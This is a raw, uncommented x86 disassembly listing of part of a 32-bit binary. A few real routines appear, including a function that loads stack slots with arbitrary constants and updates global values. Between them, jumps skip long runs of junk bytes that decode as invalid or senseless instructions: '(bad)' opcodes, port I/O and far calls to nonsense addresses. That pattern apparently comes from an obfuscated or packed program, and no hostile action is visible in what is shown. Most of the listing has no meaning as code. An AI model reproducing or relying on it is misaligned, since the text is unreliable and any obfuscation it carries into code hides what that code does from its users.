  4121d8:	mov    dl,BYTE PTR [ecx]
  4121da:	ja     0x412172
  4121dc:	pop    es
  4121dd:	es ds cld 
  4121e0:	(bad)  
  4121e1:	lods   al,BYTE PTR ds:[esi]
  4121e2:	mov    ah,0x5d
  4121e4:	push   ebp
  4121e5:	mov    esi,0x416c959b
  4121ea:	pop    ss
  4121eb:	test   eax,0x11dc4867
  4121f0:	xor    al,0x56
  4121f2:	in     al,dx
  4121f3:	xchg   esi,eax
  4121f4:	daa    
  4121f5:	and    bh,bl
  4121f7:	dec    edi
  4121f8:	add    BYTE PTR [ebp+ebp*2+0x2d],al
  4121fc:	mov    esi,0xd7a4fa13
  412201:	xchg   DWORD PTR [esi+0x33],edi
  412204:	dec    edi
  412205:	test   eax,0x9e273bdc
  41220a:	test   al,0x95
  41220c:	fldcw  WORD PTR [eax+0x20]
  41220f:	jnp    0x4121d4
  412211:	in     al,0x35
  412213:	test   BYTE PTR [eax],bh
  412215:	add    BYTE PTR [eax],al
  412217:	mov    eax,DWORD PTR [eax+edx*1]
  41221a:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  412221:	mov    eax,DWORD PTR [ebp-0x34]
  412224:	mov    edx,DWORD PTR [ebp-0xb4]
  41222a:	lea    eax,[edx+eax*1-0x76d2]
  412231:	mov    edx,DWORD PTR [ebp-0x44]
  412234:	mov    esi,DWORD PTR [ebp-0x84]
  41223a:	or     eax,edx
  41223c:	xor    edx,edx
  41223e:	div    esi
  412240:	mov    edx,DWORD PTR [ebp-0x54]
  412243:	add    eax,0x43d7
  412248:	xor    eax,0x5e6a
  41224d:	add    eax,DWORD PTR [edx+ecx*1]
  412250:	mov    ecx,DWORD PTR ds:0x4225cc
  412256:	add    DWORD PTR [eax],ecx
  412258:	mov    eax,DWORD PTR [ebp-0x90]
  41225e:	mov    ecx,DWORD PTR [ebp-0x8c]
  412264:	mov    edx,DWORD PTR [ebp-0xa0]
  41226a:	mov    esi,DWORD PTR [ebp-0x9c]
  412270:	sub    edx,eax
  412272:	mov    eax,DWORD PTR [ebp-0xb0]
  412278:	sbb    esi,ecx
  41227a:	mov    ecx,DWORD PTR [ebp-0xac]
  412280:	xor    edx,eax
  412282:	mov    eax,DWORD PTR [ebp-0xc0]
  412288:	xor    esi,ecx
  41228a:	mov    ecx,DWORD PTR [ebp-0xbc]
  412290:	jmp    0x412505
  412295:	mov    ah,0x74
  412297:	xchg   edx,eax
  412298:	cli    
  412299:	push   edx
  41229a:	fistp  DWORD PTR [edx+ebx*1]
  41229d:	cs jge 0x4122b6
  4122a0:	stos   BYTE PTR es:[edi],al
  4122a1:	stos   BYTE PTR es:[edi],al
  4122a2:	mov    al,0x79
  4122a4:	jl     0x4122a4
  4122a6:	pusha  
  4122a7:	sbb    BYTE PTR [eax],bl
  4122a9:	jno    0x4122bf
  4122ab:	sbb    BYTE PTR [eax],bl
  4122ad:	aaa    
  4122ae:	adc    DWORD PTR [ecx+0x4d5693de],0x5512435
  4122b8:	fisttp WORD PTR [ebx]
  4122ba:	xchg   ebx,eax
  4122bb:	jnp    0x412266
  4122bd:	or     BYTE PTR [edi+0x70e19ea0],ah
  4122c3:	pop    ecx
  4122c4:	shr    BYTE PTR [ebp+0x4f68dfd1],0x7c
  4122cb:	imul   ebp,DWORD PTR [ebx+esi*2],0x7228d7e4
  4122d2:	mov    dh,0x18
  4122d4:	in     eax,0xd5
  4122d6:	daa    
  4122d7:	or     eax,0x65da7eb7
  4122dc:	jno    0x412315
  4122de:	test   al,0x7e
  4122e0:	jbe    0x412274
  4122e2:	xchg   ebx,eax
  4122e3:	xchg   edx,eax
  4122e4:	xchg   edx,eax
  4122e5:	retf   0x323e
  4122e8:	mov    esi,0xf6f2ec4
  4122ed:	test   esp,eax
  4122ef:	jl     0x4122d6
  4122f1:	jle    0x412311
  4122f3:	sbb    ch,ah
  4122f5:	jo     0x41229a
  4122f7:	sub    bl,BYTE PTR [ecx+0x62]
  4122fa:	stc    
  4122fb:	push   ds
  4122fc:	out    dx,al
  4122fd:	mov    ecx,0xc24cafa7
  412302:	(bad)  
  412303:	sbb    al,0x55
  412305:	cmp    edx,esi
  412307:	push   ebp
  412308:	retf   0x7c21
  41230b:	cmp    esi,esp
  41230d:	adc    BYTE PTR [esi],ch
  41230f:	mov    ds:0xdf3165ec,eax
  412314:	dec    esi
  412315:	mov    ah,0x86
  412317:	bound  esp,QWORD PTR [edx-0x77]
  41231a:	adc    al,BYTE PTR [ebx+0xb8b9bb3]
  412320:	sub    eax,0x6a048b27
  412325:	das    
  412326:	je     0x412372
  412328:	xor    BYTE PTR ds:0x1121b806,bh
  41232e:	add    al,0x86
  412330:	test   BYTE PTR [esi],dh
  412332:	adc    eax,0xda1e63
  412337:	pop    eax
  412338:	mov    ds:0x33ab4894,eax
  41233d:	mov    edx,0x5bd2188d
  412342:	cmp    eax,0xc4148445
  412347:	push   ds
  412348:	js     0x4122f8
  41234a:	adc    edi,0x117098c9
  412350:	push   0x61ad1e77
  412355:	into   
  412356:	mov    ah,BYTE PTR [esi-0x3d]
  412359:	leave  
  41235a:	out    dx,al
  41235b:	sub    DWORD PTR [edi-0x23],edx
  41235e:	int3   
  41235f:	imul   cx,WORD PTR [ecx+edx*8-0x45d352cb],0xa
  412368:	push   eax
  412369:	ins    DWORD PTR es:[edi],dx
  41236a:	out    dx,al
  41236b:	adc    al,BYTE PTR [edx-0x185ab419]
  412371:	js     0x412328
  412373:	cdq    
  412374:	mov    DWORD PTR [ecx+0x351c84b8],edi
  41237a:	adc    BYTE PTR [esi-0x24729e84],ch
  412380:	faddp  st(1),st
  412382:	pusha  
  412383:	call   0x86cd:0xa5c8fd59
  41238a:	andnps xmm6,XMMWORD PTR [edi-0xe]
  41238e:	(bad)  
  41238f:	mov    ds:0xd570c58d,eax
  412394:	inc    ebp
  412395:	in     al,0x45
  412397:	out    dx,eax
  412398:	mov    cl,0x5c
  41239a:	add    eax,esi
  41239c:	enter  0xd20f,0x9f
  4123a0:	call   0x7c4a:0xcba501f8
  4123a7:	push   edx
  4123a8:	lds    edx,FWORD PTR [edi-0x1b8b8882]
  4123ae:	popf   
  4123af:	sub    bl,BYTE PTR [edi]
  4123b1:	(bad)  
  4123b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4123b3:	sub    eax,0xa2b5e4b3
  4123b8:	test   BYTE PTR [edx-0x36],ah
  4123bb:	xchg   edx,eax
  4123bc:	call   0xbd954587
  4123c1:	cmp    DWORD PTR [ebp-0x33bc24e4],esi
  4123c7:	(bad)  
  4123c8:	cmp    BYTE PTR [edi-0x797ab892],al
  4123ce:	push   edi
  4123cf:	out    dx,eax
  4123d0:	addr16 xchg ebx,eax
  4123d2:	cmp    cl,0x10
  4123d5:	push   cs
  4123d6:	push   edx
  4123d7:	xor    edi,ecx
  4123d9:	xchg   ebp,eax
  4123da:	and    BYTE PTR [esi+edi*2],dl
  4123dd:	sbb    edx,DWORD PTR [edi]
  4123df:	sbb    DWORD PTR [ebx+0x707afba9],edi
  4123e5:	outs   dx,BYTE PTR ds:[esi]
  4123e6:	lods   eax,DWORD PTR ds:[esi]
  4123e7:	or     eax,0x89c793b0
  4123ec:	push   ebx
  4123ed:	sub    dh,BYTE PTR [edx-0x1563df7b]
  4123f3:	enter  0xd7bd,0x99
  4123f7:	dec    ebx
  4123f8:	xor    dh,BYTE PTR [ebx+0x65]
  4123fb:	call   0xe5b7:0x448c65d8
  412402:	inc    esp
  412403:	mov    dh,0xbd
  412405:	outs   dx,BYTE PTR ds:[esi]
  412406:	or     eax,DWORD PTR [edi+0x27]
  412409:	jg     0x41245b
  41240b:	add    eax,0x4ee6f09b
  412410:	xchg   DWORD PTR [edi-0x4803002a],edx
  412416:	push   edi
  412417:	adc    bh,BYTE PTR [eax-0x74d5f06a]
  41241d:	aaa    
  41241e:	dec    eax
  41241f:	dec    esi
  412420:	leave  
  412421:	sbb    eax,0x87aaf269
  412426:	xlat   BYTE PTR ds:[ebx]
  412427:	shl    BYTE PTR [esi-0x72],cl
  41242a:	jnp    0x41242c
  41242c:	leave  
  41242d:	daa    
  41242e:	not    DWORD PTR ss:[ecx]
  412431:	dec    edx
  412432:	xor    eax,0x64c5d11d
  412437:	in     al,dx
  412438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412439:	ret    0x1a37
  41243c:	xchg   ebx,eax
  41243d:	xor    al,0x2f
  41243f:	ins    BYTE PTR es:[edi],dx
  412440:	xchg   ebx,eax
  412441:	inc    esp
  412442:	ja     0x412440
  412444:	jl     0x4124a1
  412446:	dec    esi
  412447:	rcr    BYTE PTR [eax-0x52],1
  41244a:	outs   dx,DWORD PTR ds:[esi]
  41244b:	pushf  
  41244c:	sub    eax,0x372a0038
  412451:	inc    eax
  412452:	in     eax,dx
  412453:	in     al,0x43
  412455:	push   es
  412456:	or     ecx,ebx
  412458:	jg     0x4124b5
  41245a:	pop    es
  41245b:	dec    ebp
  41245c:	mov    dh,0xe6
  41245e:	pop    edi
  41245f:	inc    edi
  412460:	enter  0xfb92,0xb2
  412464:	jmp    FWORD PTR [ebx-0x2e]
  412467:	sbb    dh,bl
  412469:	adc    eax,0x6f58b696
  41246e:	pop    edx
  41246f:	pop    edx
  412470:	push   esi
  412471:	pop    es
  412472:	mov    es,edx
  412474:	das    
  412475:	scas   al,BYTE PTR es:[edi]
  412476:	push   edi
  412477:	sbb    al,0x61
  412479:	add    al,0xb3
  41247b:	mov    esp,0x72ab7935
  412480:	das    
  412481:	inc    edi
  412482:	sub    eax,0x44856b23
  412487:	scas   al,BYTE PTR es:[edi]
  412488:	adc    cl,BYTE PTR [ecx-0x1450db1a]
  41248e:	retf   0xeb40
  412491:	test   eax,0xa86d5a17
  412496:	dec    ebx
  412497:	repnz popa 
  412499:	xchg   ebp,eax
  41249a:	pop    ss
  41249b:	pusha  
  41249c:	or     BYTE PTR [ecx+0x39],dl
  41249f:	mov    eax,ds:0x46c813a5
  4124a4:	test   BYTE PTR cs:[edi+0x6d],0xe3
  4124a9:	fldpi  
  4124ab:	clc    
  4124ac:	xlat   BYTE PTR ds:[ebx]
  4124ad:	jnp    0x41248b
  4124af:	jo     0x412481
  4124b1:	hlt    
  4124b2:	sub    eax,0xdcabedc1
  4124b7:	dec    eax
  4124b8:	and    al,0x54
  4124ba:	mov    al,0x4e
  4124bc:	jne    0x412521
  4124be:	mov    bh,0xdb
  4124c0:	and    DWORD PTR [ecx],ebx
  4124c2:	adc    edx,0x44d57442
  4124c8:	ret    0x5d1e
  4124cb:	stos   DWORD PTR es:[edi],eax
  4124cc:	ja     0x412490
  4124ce:	sbb    ch,BYTE PTR [eax+0x1be5d824]
  4124d4:	bnd jae 0x41246d
  4124d7:	pop    edx
  4124d8:	aad    0xaf
  4124da:	pop    ebx
  4124db:	fucomi st,st(5)
  4124dd:	(bad)  
  4124de:	ret    
  4124df:	inc    ecx
  4124e0:	lahf   
  4124e1:	(bad)  
  4124e2:	int    0x6d
  4124e4:	mov    bh,bh
  4124e6:	dec    ecx
  4124e7:	push   ds
  4124e8:	jle    0x412494
  4124ea:	or     ecx,DWORD PTR [esi-0x70e5df08]
  4124f0:	pop    edx
  4124f1:	push   eax
  4124f2:	jno    0x412526
  4124f4:	pop    eax
  4124f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124f6:	ss inc ecx
  4124f8:	stc    
  4124f9:	rol    esp,1
  4124fb:	push   ebp
  4124fc:	inc    ebp
  4124fd:	lds    eax,FWORD PTR [ebx+0xcd5dea0]
  412503:	add    esi,esp
  412505:	add    edx,eax
  412507:	adc    esi,ecx
  412509:	add    edx,0x2313
  41250f:	adc    esi,0x2a00
  412515:	push   esi
  412516:	push   edx
  412517:	call   0x422046
  41251c:	mov    ecx,0x1207
  412521:	sub    ecx,eax
  412523:	push   0x0
  412525:	pop    eax
  412526:	jmp    0x41279b
  41252b:	jae    0x41252c
  41252d:	mov    dl,0xf5
  41252f:	sbb    bl,BYTE PTR [ebx+esi*1-0x74c2fe82]
  412536:	jo     0x41255c
  412538:	shr    dh,cl
  41253a:	mov    esi,0x18185c57
  41253f:	jno    0x412555
  412541:	sbb    BYTE PTR [eax],bl
  412543:	xchg   ecx,eax
  412544:	idiv   BYTE PTR [ecx-0x8]
  412547:	cmp    al,0x2f
  412549:	push   ecx
  41254a:	lds    ecx,FWORD PTR [ecx+0x1e8e64c]
  412550:	pop    ebx
  412551:	jnp    0x4124e7
  412553:	add    eax,0x5fbfe670
  412558:	mov    ebx,0x8340c3a
  41255d:	ret    
  41255e:	jo     0x412575
  412560:	xor    eax,0xb41b68ca
  412565:	cli    
  412566:	inc    esi
  412567:	cwde   
  412568:	add    DWORD PTR [esp+ebp*1-0x4d],0x4f1ac2bd
  412570:	push   ebx
  412571:	(bad)  [eax]
  412573:	dec    esp
  412574:	push   DWORD PTR [edi-0x65]
  412577:	sbb    ebx,DWORD PTR [ecx+0xbc35164]
  41257d:	loopne 0x4125b5
  41257f:	sti    
  412580:	cld    
  412581:	or     al,0x6
  412583:	mov    esp,0x87016c8e
  412588:	ds aaa 
  41258a:	xchg   edi,eax
  41258b:	cmp    al,0x72
  41258d:	pop    ebp
  41258e:	leave  
  41258f:	leave  
  412590:	cmp    ah,BYTE PTR [edx-0xd]
  412593:	jg     0x4125ae
  412595:	ja     0x4125f0
  412597:	or     DWORD PTR [edi+ebp*8-0x4baa3aa9],ebp
  41259e:	dec    ecx
  41259f:	bound  edx,QWORD PTR ds:0x18dbc1d7
  4125a5:	rcl    DWORD PTR [edx-0x57],0xdb
  4125a9:	xor    edx,ebp
  4125ab:	push   0xffffffae
  4125ad:	aaa    
  4125ae:	(bad)  [ecx*4+0x11628c52]
  4125b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125b6:	ds jo  0x412569
  4125b9:	rcr    DWORD PTR [edi],cl
  4125bb:	ret    
  4125bc:	out    dx,eax
  4125bd:	mov    DWORD PTR [edx+ebx*1+0x63],edi
  4125c1:	mul    al
  4125c3:	xor    eax,edx
  4125c5:	mov    eax,0x4b10025b
  4125ca:	jmp    0x9a26:0x2b3a657b
  4125d1:	adc    al,0xf
  4125d3:	outs   dx,DWORD PTR ds:[esi]
  4125d4:	leave  
  4125d5:	mov    BYTE PTR [ebp+0xe],ah
  4125d8:	inc    ebp
  4125d9:	cmc    
  4125da:	jne    0x41259d
  4125dc:	ret    0xc12
  4125df:	int    0xc3
  4125e1:	sub    eax,0x1be5235f
  4125e6:	das    
  4125e7:	into   
  4125e8:	mov    ebp,DWORD PTR [edi+0x4b761e58]
  4125ee:	inc    esi
  4125ef:	push   ebx
  4125f0:	ds aad 0xbf
  4125f3:	mov    ecx,0x5ec74cb5
  4125f8:	mov    cl,0x1b
  4125fa:	rcl    BYTE PTR [ebp+0x67],0xa
  4125fe:	into   
  4125ff:	test   ebx,edx
  412601:	bound  edx,QWORD PTR [ebx-0x7]
  412604:	xor    BYTE PTR [edx-0x17],cl
  412607:	inc    ecx
  412609:	scas   eax,DWORD PTR es:[edi]
  41260a:	push   ebp
  41260b:	mov    edx,0xc4815fe6
  412610:	or     eax,0xded6746
  412615:	jnp    0x412635
  412617:	cmp    BYTE PTR [ebp+0x68cbe555],dh
  41261d:	pushf  
  41261e:	push   edi
  41261f:	cmc    
  412620:	sar    BYTE PTR [ebx-0x1d696c03],0xa0
  412627:	mov    eax,0x787c11c1
  41262c:	push   eax
  41262d:	jne    0x412652
  41262f:	cdq    
  412630:	lods   eax,DWORD PTR ds:[esi]
  412631:	sti    
  412632:	mov    ch,0xf7
  412634:	mov    ebx,0x4de32a37
  412639:	not    DWORD PTR [eax]
  41263b:	pushf  
  41263c:	in     eax,0x87
  41263e:	adc    eax,0x954f6b0f
  412643:	mov    dh,0xcf
  412645:	fucomi st,st(6)
  412647:	mov    ah,0x6b
  412649:	add    edx,DWORD PTR [ebp+0x29f0f18a]
  41264f:	int    0xd5
  412651:	imul   ecx,DWORD PTR [edx+0x5a0494f2],0xffffff86
  412658:	or     esi,DWORD PTR [ecx+esi*4+0x28]
  41265c:	(bad)  
  41265d:	(bad)  
  41265e:	pop    ss
  41265f:	sub    edi,eax
  412661:	aam    0x9
  412663:	pop    ds
  412664:	std    
  412665:	out    0x9b,eax
  412667:	add    al,0x4d
  412669:	xor    edx,DWORD PTR [edi+ebp*4]
  41266c:	cmovae edx,esi
  41266f:	mov    gs,WORD PTR [esi-0x34]
  412672:	outs   dx,DWORD PTR ds:[esi]
  412673:	dec    ebx
  412674:	push   ecx
  412675:	(bad)  
  412676:	retf   
  412677:	rcr    DWORD PTR [esi+0xda02ab3],1
  41267d:	mov    ecx,0xab72ed67
  412682:	xor    eax,DWORD PTR [edx-0x3df3a094]
  412688:	jo     0x4126fb
  41268a:	les    esi,FWORD PTR [ebx-0x3c705061]
  412690:	daa    
  412691:	sub    al,0xdb
  412693:	mov    ch,0xfb
  412695:	mov    ch,0xd9
  412697:	ficom  WORD PTR [edi-0x32]
  41269a:	add    eax,0xcd4af9d
  41269f:	out    dx,eax
  4126a0:	pushf  
  4126a1:	xchg   esp,eax
  4126a2:	xchg   DWORD PTR [ebx-0x589af94b],ecx
  4126a8:	ja     0x4126cf
  4126aa:	or     DWORD PTR [eax+0x461eb373],ecx
  4126b0:	xor    bl,cl
  4126b2:	cmc    
  4126b3:	mov    ds:0xfe58f1be,eax
  4126b8:	fdivr  DWORD PTR es:[si-0x15c6]
  4126be:	xor    dh,BYTE PTR [edx-0x1e]
  4126c1:	push   0x13
  4126c3:	sub    al,0xe4
  4126c5:	out    dx,al
  4126c6:	leave  
  4126c7:	aas    
  4126c8:	aad    0xd7
  4126ca:	shl    BYTE PTR [ebp+ecx*4+0x42f13b18],1
  4126d1:	cld    
  4126d2:	jo     0x412750
  4126d4:	stc    
  4126d5:	add    ebx,DWORD PTR [ebp-0x5667b83f]
  4126db:	lahf   
  4126dc:	div    DWORD PTR [ebp+0x1b]
  4126df:	jbe    0x4126f2
  4126e1:	dec    esi
  4126e2:	dec    eax
  4126e3:	cld    
  4126e4:	aam    0x3
  4126e6:	imul   esp,DWORD PTR [ebx],0x2ba7d464
  4126ec:	pop    edx
  4126ed:	out    dx,eax
  4126ee:	lea    edi,[ecx]
  4126f0:	sbb    ah,BYTE PTR [esi+eiz*8-0x3e]
  4126f4:	pop    edx
  4126f5:	loope  0x412748
  4126f7:	push   0x772c1b03
  4126fc:	test   BYTE PTR [ebp+0x6a],bh
  4126ff:	outs   dx,BYTE PTR ds:[esi]
  412700:	das    
  412701:	fstp   TBYTE PTR [ebx]
  412703:	mov    DWORD PTR [edi],edi
  412705:	mov    ch,cl
  412707:	icebp  
  412708:	xchg   ebx,eax
  412709:	xchg   edx,eax
  41270a:	(bad)  
  41270b:	fcom   QWORD PTR [ecx]
  41270d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41270e:	and    esi,edx
  412710:	or     BYTE PTR [edi-0x48e1619c],ah
  412716:	(bad)  
  412717:	pop    ebx
  412718:	icebp  
  412719:	fs push ds
  41271b:	es jmp 0xe8c9:0xf4d10833
  412723:	gs mov eax,0x6e0b1ea0
  412729:	daa    
  41272a:	xchg   bh,bl
  41272c:	pusha  
  41272d:	test   al,0xb0
  41272f:	std    
  412730:	outs   dx,DWORD PTR ds:[esi]
  412731:	mov    BYTE PTR [bx+0x53],dh
  412735:	imul   edi,esp,0xffffffb3
  412738:	sahf   
  412739:	test   eax,0xfabaeb44
  41273e:	inc    ebp
  41273f:	and    eax,0x4705fac0
  412744:	and    bh,BYTE PTR [esi-0x581675b1]
  41274a:	pop    edi
  41274b:	syscall 
  41274d:	or     dl,al
  41274f:	and    al,0x97
  412751:	pop    edi
  412752:	call   0xe10dd016
  412757:	and    ecx,eax
  412759:	xor    BYTE PTR [edi+0x6c],dl
  41275c:	lods   eax,DWORD PTR ds:[esi]
  41275d:	fs mov al,0xc7
  412760:	in     al,dx
  412761:	pop    esp
  412762:	dec    eax
  412763:	cmp    eax,0x75525cd
  412768:	out    dx,eax
  412769:	jae    0x41279d
  41276b:	push   ebx
  41276c:	push   ss
  41276d:	or     DWORD PTR [ecx],ebp
  41276f:	pop    ss
  412770:	dec    ebx
  412771:	out    dx,al
  412772:	ja     0x41277e
  412774:	push   ss
  412775:	and    bh,bl
  412777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412778:	ins    BYTE PTR es:[edi],dx
  412779:	xchg   esp,eax
  41277a:	xor    bh,BYTE PTR [ebp+0x8]
  41277d:	retf   0xab10
  412780:	loope  0x412707
  412782:	scas   eax,DWORD PTR es:[edi]
  412783:	cdq    
  412784:	lahf   
  412785:	push   edx
  412786:	icebp  
  412787:	push   0xecefc0b0
  41278c:	mov    al,0xe1
  41278e:	ins    DWORD PTR es:[edi],dx
  41278f:	xchg   DWORD PTR [ebx-0x5ff9e117],esi
  412795:	rep stos DWORD PTR es:[edi],eax
  412797:	xchg   edx,eax
  412798:	and    eax,edi
  41279a:	push   0x158bc21b
  41279f:	int3   
  4127a0:	and    eax,0xf6330042
  4127a5:	cmp    edx,ecx
  4127a7:	jne    0x4127da
  4127ad:	cmp    esi,eax
  4127af:	jne    0x4127da
  4127b5:	mov    eax,DWORD PTR [ebp-0x4]
  4127b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4127bb:	add    eax,0x4296
  4127c0:	shr    eax,0x2
  4127c3:	or     eax,ecx
  4127c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4127c8:	xor    eax,ecx
  4127ca:	xor    eax,0x4e94
  4127cf:	add    eax,DWORD PTR ds:0x4225cc
  4127d5:	mov    ds:0x4225d4,eax
  4127da:	pop    esi
  4127db:	leave  
  4127dc:	ret    0x4
  4127df:	push   ebp
  4127e0:	mov    ebp,esp
  4127e2:	sub    esp,0x58
  4127e5:	push   ebx
  4127e6:	push   esi
  4127e7:	push   edi
  4127e8:	mov    DWORD PTR [ebp-0x58],0x3082
  4127ef:	mov    DWORD PTR [ebp-0x54],0x37a2
  4127f6:	mov    DWORD PTR [ebp-0x50],0x49d6
  4127fd:	mov    DWORD PTR [ebp-0x4c],0x6390
  412804:	mov    DWORD PTR [ebp-0x48],0x40f2
  41280b:	mov    DWORD PTR [ebp-0x44],0x21d4
  412812:	mov    DWORD PTR [ebp-0x28],0x4726
  412819:	mov    DWORD PTR [ebp-0x24],0x221a
  412820:	mov    DWORD PTR [ebp-0x30],0x768c
  412827:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41282e:	mov    DWORD PTR [ebp-0x40],0x6cf6
  412835:	mov    DWORD PTR [ebp-0x3c],0x94c
  41283c:	mov    DWORD PTR [ebp-0x38],0x4797
  412843:	mov    DWORD PTR [ebp-0x34],0x4439
  41284a:	mov    DWORD PTR [ebp-0x20],0x2531
  412851:	mov    esi,0x5a3e
  412856:	mov    DWORD PTR [ebp-0x1c],esi
  412859:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  412860:	mov    DWORD PTR [ebp-0x14],0x7
  412867:	mov    DWORD PTR [ebp-0x10],0xe3a
  41286e:	mov    DWORD PTR [ebp-0xc],0x6a6e
  412875:	mov    DWORD PTR [ebp-0x8],0x6b99
  41287c:	mov    DWORD PTR [ebp-0x4],0x2acd
  412883:	mov    eax,DWORD PTR [ebp-0x10]
  412886:	mov    ecx,DWORD PTR [ebp-0xc]
  412889:	mov    eax,DWORD PTR [ebp-0x8]
  41288c:	mov    ecx,DWORD PTR [ebp-0x4]
  41288f:	mov    eax,DWORD PTR [ebp-0x18]
  412892:	mov    ecx,DWORD PTR [ebp-0x14]
  412895:	jmp    0x412c6d
  41289a:	icebp  
  41289b:	not    esi
  41289d:	xchg   ecx,eax
  41289e:	into   
  41289f:	xor    DWORD PTR [esi],ebp
  4128a1:	jbe    0x4128b2
  4128a3:	cmc    
  4128a4:	gs mov esp,0xaa277261
  4128aa:	scas   al,BYTE PTR es:[edi]
  4128ab:	pop    eax
  4128ac:	sbb    BYTE PTR [eax],bl
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	adc    bl,BYTE PTR [eax]
  4128b1:	sbb    BYTE PTR [eax+0x72],ah
  4128b4:	push   esi
  4128b5:	daa    
  4128b6:	cmp    BYTE PTR ds:0xc7f4a2f0,ah
  4128bc:	push   ss
  4128bd:	and    eax,0xb9b75a0d
  4128c2:	or     edx,DWORD PTR [ebx+0x32]
  4128c5:	cdq    
  4128c6:	je     0x41293a
  4128c8:	pop    eax
  4128c9:	mov    BYTE PTR ds:0xd6f48381,dl
  4128cf:	sbb    al,0xab
  4128d1:	popf   
  4128d2:	pop    edx
  4128d3:	mov    ch,0x52
  4128d5:	push   eax
  4128d6:	cmp    BYTE PTR [ebx],al
  4128d8:	out    0x65,eax
  4128da:	mov    edx,0x36812513
  4128df:	inc    edi
  4128e0:	out    0x9c,al
  4128e2:	xchg   esi,eax
  4128e3:	pop    esi
  4128e4:	xchg   ebp,eax
  4128e5:	dec    edx
  4128e6:	scas   eax,DWORD PTR es:[edi]
  4128e7:	icebp  
  4128e8:	sub    BYTE PTR [ebp+edx*8+0x3efac84d],ch
  4128ef:	sbb    BYTE PTR [ecx],0x3
  4128f2:	mov    ds:0x2bb3e859,al
  4128f7:	pop    ecx
  4128f8:	test   eax,0xd90d2d5b
  4128fd:	outs   dx,BYTE PTR ds:[esi]
  4128fe:	dec    edi
  4128ff:	cmp    ch,0x81
  412902:	sub    ecx,DWORD PTR [edi+esi*8+0x7cbeffb]
  412909:	ins    DWORD PTR es:[edi],dx
  41290a:	aaa    
  41290b:	fcmovne st,st(4)
  41290d:	inc    esp
  41290e:	inc    ebx
  41290f:	into   
  412910:	push   edi
  412911:	cld    
  412912:	imul   esp,DWORD PTR [ebp+0xb065670],0x15
  412919:	dec    ebx
  41291a:	xchg   esp,eax
  41291b:	popf   
  41291c:	push   esi
  41291d:	sbb    BYTE PTR ds:0x5727a47e,al
  412923:	add    ebp,DWORD PTR [eax]
  412925:	mul    DWORD PTR [edi-0x4e]
  412928:	sub    BYTE PTR ds:0xb9b2049e,al
  41292e:	in     eax,0x28
  412930:	loopne 0x412907
  412932:	xchg   ebx,eax
  412933:	dec    esp
  412934:	sbb    al,0xe4
  412936:	sar    ecx,1
  412938:	lahf   
  412939:	xor    al,0x82
  41293b:	mov    ecx,0x1e504a8e
  412940:	mov    dl,0x5d
  412942:	scas   eax,DWORD PTR es:[edi]
  412943:	sbb    ch,BYTE PTR [edx-0x2c]
  412946:	sbb    edx,ecx
  412948:	popf   
  412949:	imul   esi,DWORD PTR [ebx],0x39
  41294c:	push   ss
  41294d:	ror    DWORD PTR cs:[edx-0x54],cl
  412951:	inc    DWORD PTR [edi]
  412953:	jp     0x4129b6
  412955:	jg     0x412918
  412957:	fcomp  QWORD PTR [esi-0x966d7ba]
  41295d:	mov    sp,0x614c
  412961:	retf   0x295d
  412964:	adc    eax,DWORD PTR [bp+si]
  412967:	or     DWORD PTR [ecx-0x7f],esp
  41296a:	sub    eax,0x4ed208a6
  41296f:	ret    0xd06d
  412972:	sub    al,0x34
  412974:	push   ecx
  412975:	ror    ch,1
  412977:	fwait
  412978:	(bad)  
  412979:	lods   eax,DWORD PTR ds:[esi]
  41297a:	mov    ds:0x464bcd6,eax
  41297f:	(bad)  
  412980:	in     eax,0x62
  412982:	ds mov ch,0x4e
  412985:	(bad)  
  412986:	pop    ds
  412987:	ins    DWORD PTR es:[edi],dx
  412988:	enter  0x8b1a,0xe
  41298c:	sti    
  41298d:	pop    ecx
  41298e:	aam    0x6c
  412990:	fwait
  412991:	icebp  
  412992:	xchg   DWORD PTR [edi-0x4f],eax
  412995:	dec    esi
  412996:	xchg   ebx,eax
  412997:	cld    
  412998:	xchg   ebp,eax
  412999:	test   eax,0x48866e86
  41299e:	js     0x4129b1
  4129a0:	pop    edi
  4129a1:	les    edx,FWORD PTR ds:0x812e3bc0
  4129a7:	not    edi
  4129a9:	fist   DWORD PTR [ebx-0x74474f43]
  4129af:	ins    DWORD PTR es:[edi],dx
  4129b0:	jbe    0x41299c
  4129b2:	or     DWORD PTR ds:0xde6424b3,eax
  4129b8:	jno    0x4129cc
  4129ba:	stc    
  4129bb:	fidivr WORD PTR [edx+ebp*4]
  4129be:	push   sp
  4129c0:	jmp    0x478c:0x6a1a0ca1
  4129c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129c8:	call   0x89c7f339
  4129cd:	xor    esp,DWORD PTR [ebp-0x19aed291]
  4129d3:	pop    esi
  4129d4:	sar    edx,cl
  4129d6:	sub    BYTE PTR [esi],dh
  4129d8:	sar    BYTE PTR [ebp+esi*2-0x65],0x8d
  4129dd:	jg     0x412a16
  4129df:	iret   
  4129e0:	fst    st(6)
  4129e2:	clc    
  4129e3:	dec    esi
  4129e4:	or     BYTE PTR [esi],ah
  4129e6:	jo     0x412992
  4129e8:	cmp    al,0xa0
  4129ea:	stos   BYTE PTR es:[edi],al
  4129eb:	cli    
  4129ec:	sub    DWORD PTR [eax+ebp*1],ecx
  4129ef:	ret    0x1408
  4129f2:	out    0xc6,eax
  4129f4:	retf   
  4129f5:	inc    ecx
  4129f6:	out    0xe3,al
  4129f8:	jmp    0x5b94:0xfcb27b5
  4129ff:	addr16 mov al,0x8b
  412a02:	lods   eax,DWORD PTR ds:[esi]
  412a03:	std    
  412a04:	cmp    BYTE PTR [esi],al
  412a06:	out    0x42,al
  412a08:	das    
  412a09:	lock sub BYTE PTR [ebx+0x10],ch
  412a0d:	push   0x50
  412a0f:	jns    0x412a07
  412a11:	xchg   ebx,eax
  412a12:	add    BYTE PTR [eax+0x40],bh
  412a15:	test   al,0xbe
  412a17:	(bad)  
